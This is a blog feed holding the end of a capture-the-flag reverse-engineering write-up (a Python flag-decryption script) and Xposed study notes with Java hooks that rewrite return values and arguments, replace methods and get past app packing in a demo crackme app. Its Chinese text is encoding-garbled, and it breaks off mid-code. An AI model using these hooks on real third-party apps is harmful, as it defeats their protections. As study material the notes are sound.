number\">0x92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#load_data = [0xA7, 0x51, 0x68, 0x52, 0x85, 0x27, 0xFF, 0x31, 0x88, 0x87, 0xD2, 0xC7, 0xD3, 0x23, 0x3F, 0x52, 0x55, 0x10, 0x1F, 0xAF, 0x27, 0xF0, 0x94, 0x5C, 0xCD, 0x3F, 0x7A, 0x79, 0x9F, 0x2F, 0xF0, 0xE7, 0x45, 0xF0, 0x86, 0x3C, 0xF9, 0xB0, 0xEA, 0x6D, 0x90, 0x42, 0xF7, 0x91, 0xED, 0x3A, 0x9A, 0x7C, 0x01, 0x6B, 0x84, 0xDC, 0x6C, 0xC8, 0x43, 0x07, 0x5C, 0x08, 0xF7, 0xDF, 0xEB, 0xE3, 0xAE, 0xA4]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>crypto_table <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>s0_255<span class=\"token punctuation\">,</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#get order table</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>source <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>replaced <span class=\"token operator\">=</span> <span class=\"token string\">'HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m'</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>revsere_table <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#index æ˜¯ source åœ¨ replace ä¸­çš„ä¸‹æ ‡</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    revsere_table<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>replaced<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>cmp_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x526851A7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31FF2785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D28788</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x523F23D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF1F1055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C94F027</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x797A3FCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7F02F9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C86F045</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DEAB0F9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91F74290</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C9A3AED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC846B01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0743C86C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDFF7085C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4AEE3EB</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> cmp_data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    tmp<span class=\"token operator\">+=</span>de_cmp<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    tmp <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> crypto_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    tmp <span class=\"token operator\">=</span> reverse_order<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> revsere_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>å…¶ä¸­ python å’Œ C è¯­è¨€çš„ä½è¿ç®—æœ‰æ‰€ä¸åŒ (å¯¹äºç¬¦å·ä½çš„å¤„ç†) æ‰€ä»¥éœ€è¦ä½¿ç”¨ np åº“</p>\n<p>è¿è¡Œå³å¯å¾—åˆ° flag</p>\n<p>flag æ˜¯ä¸€ä¸ªéŸ³ä¹ç½‘å€ ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°å½©è›‹å§</p>\n<h2 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“</h2>\n<p>æœ‰å…³åŠ å¯†ç®—æ³•ç”±äºå¤ªèœäº†ä¸ä¼šé€† é‡‡ç”¨çš„æ˜¯æš´åŠ›çš„åšæ³• ç›¸å½“äºæ˜¯ 00-ff çš„ä¸€ä¸ªè¡¨ æ„Ÿè§‰ä»¥åé‡åˆ°å¤æ‚çš„è¿ç®—ä½†åˆæ˜¯æŒ‰ä½åŠ å¯†çš„éƒ½å¯ä»¥è¿™æ ·åšï¼Ÿ</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/08/Xposed%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2023/09/08/Xposed%E5%AD%A6%E4%B9%A0/",
            "title": "Xposedå­¦ä¹ ",
            "date_published": "2023-09-08T07:41:12.000Z",
            "content_html": "<h1 id=\"xposed\"><a class=\"markdownIt-Anchor\" href=\"#xposed\">#</a> Xposed</h1>\n<p><img data-src=\"/images/image-20230905204011814.png\" alt=\"image-20230905204011814\"></p>\n<p><img data-src=\"/images/image-20230905204153283.png\" alt=\"image-20230905204153283\"></p>\n<p>æ–¹æ³•åå¤åˆ¶ä¸º xposed çš„ç‰‡æ®µ</p>\n<p><img data-src=\"/images/image-20230905214904274.png\" alt=\"image-20230905214904274\"></p>\n<h3 id=\"1hookæ™®é€šæ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#1hookæ™®é€šæ–¹æ³•\">#</a> 1.Hook æ™®é€šæ–¹æ³•</h3>\n<p>ä¿®æ”¹è¿”å›å€¼</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        param<span class=\"token punctuation\">.</span><span class=\"token function\">setResult</span><span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>ä¿®æ”¹å‚æ•°</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> <span class=\"token string\">\"pt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230906202808776.png\" alt=\"image-20230906202808776\"></p>\n<h3 id=\"2hookå¤æ‚è‡ªå®šä¹‰å‚æ•°\"><a class=\"markdownIt-Anchor\" href=\"#2hookå¤æ‚è‡ªå®šä¹‰å‚æ•°\">#</a> 2.Hook å¤æ‚ &amp; è‡ªå®šä¹‰å‚æ•°</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> a <span class=\"token operator\">=</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ç±»å\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">hookAllMethods</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token string\">\"æ–¹æ³•å\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å¯ä»¥å…å¡«å‚æ•°</span></pre></td></tr></table></figure><h3 id=\"3hookæ›¿æ¢å‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#3hookæ›¿æ¢å‡½æ•°\">#</a> 3.Hook æ›¿æ¢å‡½æ•°</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> a <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ç±»å\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">hookAllMethods</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span><span class=\"token string\">\"æ–¹æ³•å\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodReplacement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">replaceHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> methodHookParam<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"4hookåŠ å›ºé€šæ€\"><a class=\"markdownIt-Anchor\" href=\"#4hookåŠ å›ºé€šæ€\">#</a> 4.Hook åŠ å›ºé€šæ€</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>å¤åˆ¶ä»£ç  éšè—ä»£ç <span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Application</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"attach\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Context</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Context</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">)</span> param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ClassLoader</span> classLoader <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">//hook é€»è¾‘åœ¨è¿™é‡Œé¢å†™  </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>hook åŠ å›ºåº”ç”¨ç¬¬ä¸€æ­¥æ‹¿åˆ° classloader</p>\n<p><strong>æ€»çš„ Hook.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sky<span class=\"token punctuation\">.</span>xposeddemo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>app<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Application</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Context</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Log</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IXposedHookLoadPackage</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_MethodHook</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_MethodReplacement</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XposedBridge</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XposedHelpers</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span>callbacks<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_LoadPackage</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hook</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IXposedHookLoadPackage</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">handleLoadPackage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">XC_LoadPackage<span class=\"token punctuation\">.</span>LoadPackageParam</span> loadPackageParam<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>loadPackageParam<span class=\"token punctuation\">.</span>packageName<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">/*XposedHelpers.findAndHookMethod (\"com.zj.wuaipojie.Demo\", loadPackageParam.classLoader, \"a\", String.class, new XC_MethodHook () &#123;// è¦æ ¹æ®å®é™…ä¼ å…¥å‚æ•°çš„ç±»å‹</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            protected void beforeHookedMethod (MethodHookParam param) throws Throwable 